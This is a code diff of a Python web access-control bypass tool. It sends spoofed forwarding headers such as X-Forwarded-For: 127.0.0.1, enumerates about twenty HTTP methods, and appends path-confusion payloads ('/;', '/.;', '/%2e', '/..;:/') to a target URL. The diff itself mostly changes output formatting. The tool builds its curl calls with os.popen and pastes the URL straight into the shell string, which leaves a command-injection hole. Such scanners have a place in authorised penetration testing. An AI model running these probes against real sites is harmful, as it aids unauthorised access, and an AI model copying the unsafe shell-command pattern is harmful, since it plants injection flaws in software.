@@ -34,11 +34,11 @@ def host_header_injection(header, defined_url):
     if "Authenticate" in text:
         indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")
     elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")
 
 def http_methods(method, defined_url):
     indicator = ""
@@ -49,11 +49,11 @@ def http_methods(method, defined_url):
     if "Authenticate" in text:
         indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     elif int(status) > 299 and int(status) < 400 or int(status) == 401:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     
 def url_injection(payload, defined_url):
     indicator = ""
@@ -63,20 +63,23 @@ def url_injection(payload, defined_url):
     remaining_url = defined_url.replace(uri, "")
     payload_url = remaining_url+payload+uri
     command = os.popen("curl -k -s -I '%s'" % (payload_url))
-    text = command.read()
-    status = text.strip().split(" ")[1]
-    if "Authenticate" in text:
-        indicator = "--> AUTH"
-    if "Content-Length" not in text:
-        length = "0"
-    else:
-        length = text.strip().split(" ")[12].split()[0]
-    if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
-    elif int(status) > 299 and int(status) < 400 or int(status) == 401:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
-    else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    try:
+        text = command.read()
+        status = text.strip().split(" ")[1]
+        if "Authenticate" in text:
+            indicator = "--> AUTH"
+        if "Content-Length" not in text:
+            length = "0"
+        else:
+            length = text.strip().split(" ")[12].split()[0]
+        if int(status) == 200:
+            return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+        elif int(status) > 299 and int(status) < 400 or int(status) == 401:
+            return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+        else:
+            return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+    except IndexError:
+        return ""
 
 def url_end_injection(payload, defined_url):
     indicator = ""
@@ -89,11 +92,11 @@ def url_end_injection(payload, defined_url):
     if "Authenticate" in text:
         indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     elif int(status) > 299 and int(status) < 400 or int(status) == 401:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
     
 def banner():
     print(BANNER)
@@ -108,55 +111,55 @@ else:
     url = sys.argv[1]
 #//////////////////////HOST HEADER INJECTIONS////////////////////////
     print(f"{BLUE}[+]Trying Host Header Injections:{RSTCOLORS}")
-    print(host_header_injection("X-Forwarded-For: 127.0.0.1", url))
-    print(host_header_injection("X-Originating-IP: 127.0.0.1", url)) 
-    print(host_header_injection("X-Remote-IP: 127.0.0.1", url))
-    print(host_header_injection("X-Client-IP: 127.0.0.1", url))
-    print(host_header_injection("X-Forwarded-Host: 127.0.0.1", url))
-    print(host_header_injection("X-Host: 127.0.0.1", url))
+    print(host_header_injection("X-Forwarded-For: 127.0.0.1", url),end="")
+    print(host_header_injection("X-Originating-IP: 127.0.0.1", url),end="") 
+    print(host_header_injection("X-Remote-IP: 127.0.0.1", url),end="")
+    print(host_header_injection("X-Client-IP: 127.0.0.1", url),end="")
+    print(host_header_injection("X-Forwarded-Host: 127.0.0.1", url),end="")
+    print(host_header_injection("X-Host: 127.0.0.1", url),end="")
 #//////////////////////POTENTIAL METHODS////////////////////////////
     print(f"{BLUE}[+]Trying all the potential HTTP methods{RSTCOLORS}")
-    print(http_methods("GET", url))
-    print(http_methods("POST", url))
-    print(http_methods("PUT", url))
-    print(http_methods("CONNECT", url))
-    print(http_methods("COPY", url))
-    print(http_methods("PATCH", url))
-    print(http_methods("TRACE", url))
-    print(http_methods("HEAD", url))
-    print(http_methods("UPDATE", url))
-    print(http_methods("LABEL", url))
-    print(http_methods("OPTIONS", url))
-    print(http_methods("MOVE", url))
-    print(http_methods("SEARCH", url))
-    print(http_methods("ARBITRARY", url))
-    print(http_methods("CHECKOUT", url))
-    print(http_methods("UNCHECKOUT", url))
-    print(http_methods("UNLOCK", url))
-    print(http_methods("MERGE", url))
-    print(http_methods("BASELINE-CONTROL", url))
-    print(http_methods("ACL", url))
+    print(http_methods("GET", url),end="")
+    print(http_methods("POST", url),end="")
+    print(http_methods("PUT", url),end="")
+    print(http_methods("CONNECT", url),end="")
+    print(http_methods("COPY", url),end="")
+    print(http_methods("PATCH", url),end="")
+    print(http_methods("TRACE", url),end="")
+    print(http_methods("HEAD", url),end="")
+    print(http_methods("UPDATE", url),end="")
+    print(http_methods("LABEL", url),end="")
+    print(http_methods("OPTIONS", url),end="")
+    print(http_methods("MOVE", url),end="")
+    print(http_methods("SEARCH", url),end="")
+    print(http_methods("ARBITRARY", url),end="")
+    print(http_methods("CHECKOUT", url),end="")
+    print(http_methods("UNCHECKOUT", url),end="")
+    print(http_methods("UNLOCK", url),end="")
+    print(http_methods("MERGE", url),end="")
+    print(http_methods("BASELINE-CONTROL", url),end="")
+    print(http_methods("ACL", url),end="")
 #/////////////////////URL Injections//////////////////////////
     print(f"{BLUE}[+]Trying url injections{RSTCOLORS}")
-    print(url_injection("/;", url))
-    print(url_injection(";", url))
-    print(url_injection(";/", url))
-    print(url_injection(";/;", url))
-    print(url_injection("//", url))
-    print(url_injection("/.;", url))
-    print(url_injection("/%2e", url))
-    print(url_injection("%2e", url))
-    print(url_injection("/%00/", url))
-    print(url_injection("/.;/:", url))
-    print(url_injection("/;foo=bar", url))
-    print(url_injection(";foo=bar", url))
-    print(url_injection("/;foo=bar;", url))
-    print(url_end_injection("%20/", url)) 
-    print(url_end_injection("/%09/", url))
-    print(url_end_injection("/%2e/", url)) 
-    print(url_end_injection("/.", url)) 
-    print(url_end_injection("//", url))
-    print(url_end_injection("/abcde/", url))
-    print(url_end_injection("/.abcde/", url))
-    print(url_end_injection("//?abcde/", url))
-    print(url_end_injection("/..;:/", url))
+    print(url_injection("/;", url),end="")
+    print(url_injection(";", url),end="")
+    print(url_injection(";/", url),end="")
+    print(url_injection(";/;", url),end="")
+    print(url_injection("//", url),end="")
+    print(url_injection("/.;", url),end="")
+    print(url_injection("/%2e", url),end="")
+    print(url_injection("%2e", url),end="")
+    print(url_injection("/%00/", url),end="")
+    print(url_injection("/.;/:", url),end="")
+    print(url_injection("/;foo=bar", url),end="")
+    print(url_injection(";foo=bar", url),end="")
+    print(url_injection("/;foo=bar;", url),end="")
+    print(url_end_injection("%20/", url),end="") 
+    print(url_end_injection("/%09/", url),end="")
+    print(url_end_injection("/%2e/", url),end="") 
+    print(url_end_injection("/.", url),end="") 
+    print(url_end_injection("//", url),end="")
+    print(url_end_injection("/abcde/", url),end="")
+    print(url_end_injection("/.abcde/", url),end="")
+    print(url_end_injection("//?abcde/", url),end="")
+    print(url_end_injection("/..;:/", url),end="")
